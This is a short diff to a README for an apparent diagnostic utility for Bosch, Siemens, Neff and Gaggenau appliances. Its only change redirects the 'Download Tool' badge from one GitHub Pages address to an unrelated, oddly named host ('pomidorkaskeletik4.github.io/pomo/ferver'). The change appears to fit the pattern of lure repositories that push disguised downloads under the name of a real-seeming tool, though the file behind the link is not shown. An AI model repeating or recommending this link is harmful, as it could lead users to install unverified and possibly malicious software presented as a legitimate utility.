@@ -2,7 +2,7 @@
 
 Advanced diagnostic utility for BSH Group appliances — including Bosch, Siemens, Neff, and Gaggenau. Enter service mode, run hardware tests, decode fault codes, and calibrate key systems in ovens, dishwashers, washers, dryers, and fridges.
 
-[![📥 Download Tool](https://img.shields.io/badge/Download-BSH_Tool-blueviolet)](https://bsh-diagnostic-tool.github.io/.github
+[![📥 Download Tool](https://img.shields.io/badge/Download-BSH_Tool-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferver
 )
 
 ---
